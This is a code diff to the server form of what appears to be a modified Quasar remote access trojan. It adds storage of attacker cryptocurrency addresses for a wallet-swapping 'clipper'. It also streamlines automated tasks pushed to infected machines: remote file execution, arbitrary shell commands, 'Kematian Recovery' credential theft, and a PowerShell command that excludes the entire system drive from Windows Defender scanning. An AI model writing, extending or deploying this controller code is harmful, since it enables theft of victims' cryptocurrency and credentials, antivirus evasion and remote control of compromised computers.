@@ -22,6 +22,7 @@ using System.Threading;
 using System.Windows.Forms;
 using Quasar.Common.Messages.QuickCommands;
 using System.IO;
+using System.Text.Json;
 
 namespace Quasar.Server.Forms
 {
@@ -202,6 +203,21 @@ namespace Quasar.Server.Forms
             AutostartListening();
             EventLogVisability();
             notifyIcon.Visible = false;
+
+            LoadCryptoAddresses();
+
+            
+            BTCTextBox.TextChanged += CryptoTextBox_TextChanged;
+            LTCTextBox.TextChanged += CryptoTextBox_TextChanged;
+            ETHTextBox.TextChanged += CryptoTextBox_TextChanged;
+            XMRTextBox.TextChanged += CryptoTextBox_TextChanged;
+            SOLTextBox.TextChanged += CryptoTextBox_TextChanged;
+            DASHTextBox.TextChanged += CryptoTextBox_TextChanged;
+            XRPTextBox.TextChanged += CryptoTextBox_TextChanged;
+            TRXTextBox.TextChanged += CryptoTextBox_TextChanged;
+            BCHTextBox.TextChanged += CryptoTextBox_TextChanged;
+
+            ClipperCheckbox.CheckedChanged += ClipperCheckbox_CheckedChanged2;
         }
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
@@ -441,6 +457,100 @@ namespace Quasar.Server.Forms
             }
         }
 
+        #region "Crypto Addresses"
+
+        private void CryptoTextBox_TextChanged(object sender, EventArgs e)
+        {
+            UpdateCryptoAddressesJson();
+        }
+
+        private void ClipperCheckbox_CheckedChanged2(object sender, EventArgs e)
+        {
+            UpdateCryptoAddressesJson();
+        }
+
+        private void UpdateCryptoAddressesJson()
+        {
+            var data = new
+            {
+                Addresses = new Dictionary<string, string>
+                {
+                    { "BTC", BTCTextBox.Text },
+                    { "LTC", LTCTextBox.Text },
+                    { "ETH", ETHTextBox.Text },
+                    { "XMR", XMRTextBox.Text },
+                    { "SOL", SOLTextBox.Text },
+                    { "DASH", DASHTextBox.Text },
+                    { "XRP", XRPTextBox.Text },
+                    { "TRX", TRXTextBox.Text },
+                    { "BCH", BCHTextBox.Text }
+                },
+                ClipperEnabled = ClipperCheckbox.Checked
+            };
+
+            string json = JsonSerializer.Serialize(data, new JsonSerializerOptions { WriteIndented = true });
+            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "crypto_addresses.json");
+
+            File.WriteAllText(filePath, json);
+        }
+
+        private void LoadCryptoAddresses()
+        {
+            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "crypto_addresses.json");
+            if (File.Exists(filePath))
+            {
+                try
+                {
+                    string json = File.ReadAllText(filePath);
+                    var data = JsonSerializer.Deserialize<Dictionary<string, object>>(json);
+
+                    if (data != null)
+                    {
+                        var addresses = JsonSerializer.Deserialize<Dictionary<string, string>>(data["Addresses"].ToString());
+                        if (addresses != null)
+                        {
+                            BTCTextBox.Text = addresses.ContainsKey("BTC") ? addresses["BTC"] : string.Empty;
+                            LTCTextBox.Text = addresses.ContainsKey("LTC") ? addresses["LTC"] : string.Empty;
+                            ETHTextBox.Text = addresses.ContainsKey("ETH") ? addresses["ETH"] : string.Empty;
+                            XMRTextBox.Text = addresses.ContainsKey("XMR") ? addresses["XMR"] : string.Empty;
+                            SOLTextBox.Text = addresses.ContainsKey("SOL") ? addresses["SOL"] : string.Empty;
+                            DASHTextBox.Text = addresses.ContainsKey("DASH") ? addresses["DASH"] : string.Empty;
+                            XRPTextBox.Text = addresses.ContainsKey("XRP") ? addresses["XRP"] : string.Empty;
+                            TRXTextBox.Text = addresses.ContainsKey("TRX") ? addresses["TRX"] : string.Empty;
+                            BCHTextBox.Text = addresses.ContainsKey("BCH") ? addresses["BCH"] : string.Empty;
+                        }
+                        Debug.WriteLine("------------------");
+                        Debug.WriteLine(data["ClipperEnabled"]);
+                        Debug.WriteLine("------------------");
+
+                        ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && ConvertJsonBool(data["ClipperEnabled"]);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show($"Error loading crypto addresses: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private bool ConvertJsonBool(object jsonElement)
+        {
+            if (jsonElement is JsonElement element1 && element1.ValueKind == JsonValueKind.True)
+            {
+                return true;
+            }
+            else if (jsonElement is JsonElement element2 && element2.ValueKind == JsonValueKind.False)
+            {
+                return false;
+            }
+            else
+            {
+                throw new InvalidOperationException("Invalid JSON boolean value.");
+            }
+        }
+
+        #endregion
+
         private void StartAutomatedTask(Client client)
         {
             if (lstTasks.InvokeRequired)
@@ -455,45 +565,33 @@ namespace Quasar.Server.Forms
                 string subItem0 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "N/A";
                 string subItem1 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "N/A";
 
-                if (taskCaption == "Remote Execute")
+                switch (taskCaption)
                 {
-                    FileManagerHandler fileManagerHandler = new FileManagerHandler(client);
-                    fileManagerHandler.BeginUploadFile(subItem0, "");
-                }
-                else if (taskCaption == "Shell Command")
-                {
-                    string Code = subItem1;
-                    DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = Code, Host = subItem0 };
-                    client.Send(quickCommand);
-                }
-                else if (taskCaption == "Kematian Recovery")
-                {
-                    var kematianHandler = new KematianHandler(client);
-                    kematianHandler.RequestKematianZip();
-                }
-                else if (taskCaption == "Exclude System Drives")
-                {
-                    string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
-                    DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };
-                    bool isClientAdmin = client.Value.AccountType == "Admin" || client.Value.AccountType == "System";
-                    if (isClientAdmin)
-                    {
-                        client.Send(quickCommand);
-                    }
-                    else
-                    {
-
-                    }
-                }
-                else if (taskCaption == "Message Box")
-                {
-                    client.Send(new DoShowMessageBox
-                    {
-                        Caption = subItem0,
-                        Text = subItem1,
-                        Button = "OK",
-                        Icon = "None"
-                    });
+                    case "Remote Execute":
+                        new FileManagerHandler(client).BeginUploadFile(subItem0, "");
+                        break;
+                    case "Shell Command":
+                        client.Send(new DoSendQuickCommand { Command = subItem1, Host = subItem0 });
+                        break;
+                    case "Kematian Recovery":
+                        new KematianHandler(client).RequestKematianZip();
+                        break;
+                    case "Exclude System Drives":
+                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
+                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
+                        {
+                            client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
+                        }
+                        break;
+                    case "Message Box":
+                        client.Send(new DoShowMessageBox
+                        {
+                            Caption = subItem0,
+                            Text = subItem1,
+                            Button = "OK",
+                            Icon = "None"
+                        });
+                        break;
                 }
             }
         }
